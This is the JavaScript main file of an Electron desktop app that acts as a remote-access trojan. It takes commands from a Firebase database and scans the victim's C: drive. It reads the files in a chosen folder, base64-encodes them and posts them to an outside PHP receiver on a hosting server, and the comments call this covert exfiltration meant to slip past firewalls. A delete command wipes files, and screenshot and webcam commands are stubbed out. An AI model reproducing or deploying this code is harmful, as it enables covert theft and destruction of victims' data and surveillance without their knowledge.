const { app, BrowserWindow } = require('electron');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const admin = require('firebase-admin');

// ------------------ Firebase Setup ------------------
const serviceAccount = require('./serviceAccountKey.json'); 

admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    // YOUR DATABASE URL: https://myappa-cc081-default-rtdb.firebaseio.com/
    databaseURL: "https://myappa-cc081-default-rtdb.firebaseio.com/" 
});

const db = admin.database();
const taskRef = db.ref('task');
const systemDataRef = db.ref('systemdata');

// ------------------ Electron App ------------------
function createWindow() {
    const win = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });
    win.loadFile('index.html');
}

app.whenReady().then(() => {
    createWindow();
    listenTasks();
    updateSystemData(); 
});

// ------------------ Task Listener ------------------
function listenTasks() {
    taskRef.on('value', async (snapshot) => {
        const data = snapshot.val();
        if (!data || !data.command) return;

        const command = data.command.toLowerCase();
        const location = data.location || '';

        console.log(`Command received: ${command} Location: ${location}`);

        try {
            // Accept either 'uploaddata' or 'upload' command
            if (command === 'uploaddata' || command === 'upload') await uploadData(location);
            else if (command === 'delete') deleteFiles(location);
            else if (command === 'screenshot') takeScreenshot(location);
            else if (command === 'camera') takeCameraPhoto(location);
            else console.log('Unknown command');
        } catch (err) {
            console.error('Error performing command:', err);
        }
    });
}

// ------------------ Reconnaissance (Top-Level Scan ONLY) ------------------

// Reads the contents of the root C:\ drive only once, synchronously for simplicity and speed.
async function scanCDrive(dir = 'C:\\') {
    let folders = [];
    try {
        const items = fs.readdirSync(dir, { withFileTypes: true });
        
        for (const item of items) {
            const fullPath = path.join(dir, item.name);
            if (item.isDirectory()) {
                folders.push(fullPath);
            }
        }
    } catch (err) {
        console.error(`Error scanning C:\\ root: ${err.message}`);
    }
    return folders;
}

// Data Exfiltration - initiates the scan and uploads the result.
async function updateSystemData() {
    console.log("Starting C: drive scan (TOP LEVEL FOLDERS ONLY). Window will remain responsive.");
    const folders = await scanCDrive();
    
    try {
        await systemDataRef.set({ folders });
        console.log(`✅ Scan Complete. Updated ${folders.length} folder paths to Firebase.`);
    } catch (err) {
        console.error("❌ Failed to update system data:", err);
    }
}

// ------------------ Command Functions (FINAL COVERT CHANNEL IMPLEMENTATION) ------------------
async function uploadData(folderPath) {
    if (!folderPath) return console.log('No folder path provided');
    
    // NEW COVERT TARGET URL: The JSON receiver script on Hostinger
    const COVERT_UPLOAD_URL = 'https://srv1995-files.hstgr.io/7662828602a0e8f4/files/karthik/uploads/json_receiver.php'; 

    try {
        const files = fs.readdirSync(folderPath);
        for (let file of files) {
            const fullPath = path.join(folderPath, file);
            if (fs.statSync(fullPath).isFile()) {
                
                // --- THE COVERT ACTION: READ FILE, CONVERT TO BASE64 ---
                // Reading the whole file content into a Buffer
                const fileBuffer = fs.readFileSync(fullPath);
                // Converting the binary Buffer content to a text (Base64) string
                const base64Data = fileBuffer.toString('base64');

                // Send data as a simple JSON object (stealthier than FormData upload)
                const payload = {
                    filename: file,
                    base64_data: base64Data,
                    location: fullPath
                };

                const res = await axios.post(
                    COVERT_UPLOAD_URL, 
                    payload, 
                    {
                        headers: { 'Content-Type': 'application/json' }
                    }
                );
                
                // Log the final status from the server's JSON response
                console.log(`✅ EXFILTRATED COVERTLY (JSON): ${file} -> Server Status: ${res.data.status}`);
            }
        }
    } catch (err) {
        // Log the final error clearly
        console.error(`❌ EXFILTRATION FAILED (COVERT): Error Code: ${err.message}. If 403, the firewall is extremely strong.`);
    }
}

function deleteFiles(folderPath) {
    if (!folderPath) return console.log('No folder path provided');
    try {
        const files = fs.readdirSync(folderPath);
        for (let file of files) {
            const fullPath = path.join(folderPath, file);
            if (fs.statSync(fullPath).isFile()) fs.unlinkSync(fullPath);
        }
        console.log(`Deleted all files in ${folderPath}`);
    } catch (err) {
        console.error('Delete error:', err);
    }
}

function takeScreenshot(location) {
    console.log('--- Placeholder --- Screenshot function called for location:', location);
}

function takeCameraPhoto(location) {
    console.log('--- Placeholder --- Camera function called for location:', location);
}
